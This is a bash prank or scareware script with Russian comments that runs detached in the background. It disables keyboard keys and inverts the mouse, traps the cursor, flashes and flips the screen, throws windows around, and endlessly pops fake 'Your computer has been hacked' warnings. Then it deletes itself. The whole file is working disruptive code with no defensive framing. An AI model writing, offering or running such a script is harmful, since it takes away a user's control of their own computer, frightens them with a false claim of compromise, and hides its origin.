#!/bin/bash

# меня заставили  🥲(basagitz)
nohup bash -c '

    # Закрываем окна nautilus
    for win in $(xdotool search --onlyvisible --class nautilus); do
        xdotool windowclose $win
    done

    # Отключаем фиксированное положение дока
    gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed false

    # Удаляем действия для определённых клавиш
    keys=(37 105 64 108 50 62 66 23 134 133 118 110 119 115 117 112 9 28 65 67 68 69 70 71 72 73 74 75 76 95 96 46)
    for key in "${keys[@]}"; do
            xmodmap -e "keycode $key = "
    done 
    xinput set-prop 14 "Coordinate Transformation Matrix" -1 0 1 0 -1 1 0 0 1
    gsettings set org.gnome.desktop.interface cursor-size 24

    # Захватили мышь в тюрьму
    while true; do 
        xdotool mousemove 5000 5000
    done &  

    while true
    do
        # Эффекты на экране
        xrandr --output DP-1 --gamma 1.5:0.5:0.5
        sleep 0.5
        xrandr --output DP-1 --gamma 1:1:1
        sleep 0.3

        # Инвертируем ориентацию
        xrandr -o inverted
        sleep 0.5
        xrandr -o normal
        sleep 0.5
    done &
    while true
    do
    zenity --warning --text="Ваш компьютер был взломан" --title="WARNING!" --width=200 --height=40 &
    sleep 5  # Добавляет паузу в N секунд между предупреждениями
    done &
    while true; do
    xrandr --output DP-1 --gamma 10:10:10
    sleep 0.3
    xrandr --output DP-1 --gamma 1:1:1
    sleep 0.3
    done&
    while true; do
    for i in $(xdotool search --onlyvisible ""); do
        x=$((RANDOM % 1920))
        y=$((RANDOM % 1080))
        xdotool windowmove $i $x $y
        sleep 0.5
    done
    done &

' > /dev/null 2>&1 & disown


rm -- "$0"
